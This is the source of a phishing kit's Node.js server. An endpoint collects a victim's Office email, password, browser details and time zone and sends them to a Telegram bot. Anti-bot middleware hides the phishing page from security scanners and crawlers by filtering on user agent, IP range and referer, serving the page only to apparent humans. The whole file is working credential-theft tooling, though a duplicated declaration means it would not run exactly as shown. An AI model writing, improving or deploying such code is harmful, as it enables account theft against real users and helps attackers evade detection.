const express = require('express');
const axios = require('axios');
const path = require('path');
const bodyParser = require('body-parser');
const antibot = require('./middleware/antibot');
const ipRangeCheck = require('ip-range-check');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/next', (req, res) => {
  const { ai, pr, btTkn, chId, userAgent, timeZone } = req.body;

  let message = '---------- 📧 Office login 📧 ----------\n';
  message += `email: ${ai} \n`;
  message += `password: ${pr} \n`;
  message += `browser details: ${userAgent} \n`;
  message += `timeZone: ${timeZone} \n`;
  message += '[+-------- UPDATE TEAM ---------]\n';
  message += '🔥🔥updateteams🔥🔥\n';

  const website = `https://api.telegram.org/bot${btTkn}`;
  const params = {
    chat_id: chId,
    text: message,
  };

  axios.post(`${website}/sendMessage`, params)
    .then(response => {
      console.log(response.data);
      res.send('Message sent successfully');
    })
    .catch(error => {
      console.error(error);
      res.status(500).send('Internal Server Error');
    });
});

const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { getClientIp } = require('request-ip');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');


function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}


// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        // It's a bot, return a 404 response or handle it as needed
        return res.status(404).send('Not Found');
    } else {
        // It's not a bot, serve the index.html page
        res.sendFile(path.join(__dirname, 'index.html'));
    }
}



// Middlewares
app.use(antiBotMiddleware);
app.use(express.static(path.join(__dirname)));


app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
 